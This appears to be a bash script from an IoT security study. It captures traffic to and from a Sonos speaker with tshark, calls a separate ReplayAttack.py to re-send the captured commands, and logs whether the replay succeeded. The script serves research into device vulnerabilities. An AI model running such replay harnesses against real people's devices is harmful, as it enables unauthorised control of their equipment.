#!/bin/bash
ANDROID_SERIAL="$1"
MAC_DEVICE="$2"
INTERFACE="$3"
PACKAGE="$4"

CROP_FUN=$(cat Result/$MAC_DEVICE/Capture/Fun_crop.txt)
CROP_REVERSE=$(cat Result/$MAC_DEVICE/Capture/Reverse_crop.txt)

tap_time="5s"
open_time="10s"
delay_time=10


#temp=$(./switch_network.sh $ANDROID_SERIAL $INTERFACE)
#MAC_SMARTPHONE="${temp##*$'\n'}"
MAC_SMARTPHONE=$5

#temp_target_ip_address=$(arp -a | grep $MAC_DEVICE | awk '{print $2}')
#let len=${#temp_target_ip_address}-1
#IP_DEVICE=$(cut -c 2-$len <<< $temp_target_ip_address)
#iptables -I FORWARD 1 -i $INTERFACE -o eth1 -m mac --mac-source $MAC_DEVICE -j DROP
#iptables -I FORWARD 2 -i eth1 -o $INTERFACE -j DROP -d $IP_DEVICE
#trap 'iptables -D FORWARD -i $INTERFACE -o eth1 -m mac --mac-source $MAC_DEVICE -j DROP; iptables -D  FORWARD -i eth1 -o $INTERFACE -j DROP -d $IP_DEVICE' SIGINT

tap_number=$(wc -l < Result/$MAC_DEVICE/Fun_coordinates.txt)
sniffing_time=$((25))


filter="(ether src  $MAC_DEVICE and dst host 10.10.0.1) or (ether dst $MAC_DEVICE and src host 10.10.0.1)"
START=1
END=1

for (( i=$START; i<=$END; i++ ))
do
   
   echo "Experiment $i"
   EXP_FOLDER="Result/$MAC_DEVICE/Experiments/Real_Time/Experiment_$i"
   MODEL_FOLDER="../Training/Result/$MAC_DEVICE/Experiments/Experiment_1"
   mkdir -p $EXP_FOLDER
   
   sonos control RINCON_38420B68763001400 pause --ip=10.10.0.15
sleep 3s
   
   echo "#############################STARTING SNIFFING#####################################"
    tshark -i "$INTERFACE" -f "$filter" -w "$EXP_FOLDER/capture.pcap" -a duration:"$sniffing_time" &
    sleep 20s

    sonos control RINCON_38420B68763001400 play --ip=10.10.0.15
    wait

    sleep 5s

   sonos control RINCON_38420B68763001400 pause --ip=10.10.0.15
sleep 3s

   echo "#############################STARTING ATTACK AFTER DELAY #####################################"
   python3 ReplayAttack.py $EXP_FOLDER/capture.pcap $MAC_SMARTPHONE $MAC_DEVICE $delay_time $MODEL_FOLDER > $EXP_FOLDER/res.txt

sleep 10s

status=$(sonos control RINCON_38420B68763001400 pause --ip=10.10.0.15)
echo $status
if [[ $status == "SonosError: Sonos error on Pause UPnPError 701 (Transition not available)" ]]
then
    echo "Replay Attack NOT working."
    echo "Replay Attack NOT working"> $EXP_FOLDER/attackResult.txt
else
  echo "Replay Attack working."
  echo "Replay Attack working"> $EXP_FOLDER/attackResult.txt
fi

sleep 3s

done

chmod -R 777 Result
python3 getAccuracy.py "Result/$MAC_DEVICE/Experiments/Real_Time/" "$END"> Result/$MAC_DEVICE/Experiments/Real_Time/Final_res.txt

#iptables -D FORWARD -i $INTERFACE -o eth1 -m mac --mac-source $MAC_DEVICE -j DROP
#iptables -D  FORWARD -i eth1 -o $INTERFACE -j DROP -d $IP_DEVICE